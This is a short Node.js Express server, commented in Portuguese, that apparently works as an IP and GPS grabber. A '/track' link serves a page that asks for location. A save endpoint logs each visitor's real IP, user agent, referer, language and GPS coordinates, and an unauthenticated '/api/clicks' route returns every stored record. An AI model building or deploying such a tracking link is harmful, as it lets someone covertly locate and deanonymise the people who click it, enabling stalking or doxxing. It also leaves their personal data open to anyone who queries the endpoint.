const express = require('express');
const fs = require('fs');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;
const CLICKS_FILE = 'clicks.json';

app.use(express.json());
app.use(express.static('public'));

if (!fs.existsSync(CLICKS_FILE)) {
  fs.writeFileSync(CLICKS_FILE, JSON.stringify([]));
}

function getClicks() {
  const data = fs.readFileSync(CLICKS_FILE, 'utf8');
  return JSON.parse(data);
}

function saveClick(clickData) {
  const clicks = getClicks();
  clicks.push(clickData);
  fs.writeFileSync(CLICKS_FILE, JSON.stringify(clicks, null, 2));
}

function getRealIP(ipHeader) {
  if (!ipHeader) return 'Desconhecido';
  const ips = ipHeader.split(',').map(ip => ip.trim());
  const realIP = ips[0];
  
  if (realIP.startsWith('10.') || realIP.startsWith('172.') || realIP.startsWith('192.168.')) {
    for (let ip of ips) {
      if (!ip.startsWith('10.') && !ip.startsWith('172.') && !ip.startsWith('192.168.')) {
        return ip;
      }
    }
    return 'IP Local';
  }
  return realIP;
}

// Rota intermediária que pede GPS
app.get('/track', (req, res) => {
  res.sendFile(path.join(__dirname, 'tracker.html'));
});

// Rota que recebe os dados do GPS
app.post('/save-location', (req, res) => {
  const fullIP = req.headers['x-forwarded-for'] || req.ip || req.connection.remoteAddress;
  const realIP = getRealIP(fullIP);
  
  const clickData = {
    timestamp: new Date().toISOString(),
    userAgent: req.headers['user-agent'],
    referer: req.headers['referer'] || 'Direct',
    ip: realIP,
    gpsLocation: req.body.gpsLocation || null,
    locationPermission: req.body.locationPermission || 'denied',
    headers: {
      'x-forwarded-for': req.headers['x-forwarded-for'],
      'accept-language': req.headers['accept-language']
    }
  };

  saveClick(clickData);
  res.json({ success: true });
});

app.get('/api/clicks', (req, res) => {
  const clicks = getClicks();
  res.json(clicks);
});

app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.listen(PORT, '0.0.0.0', () => {
  console.log(`🚀 Servidor rodando na porta ${PORT}`);
  console.log(`📊 Dashboard disponível`);
  console.log(`🔗 Link de rastreamento: /track`);
});
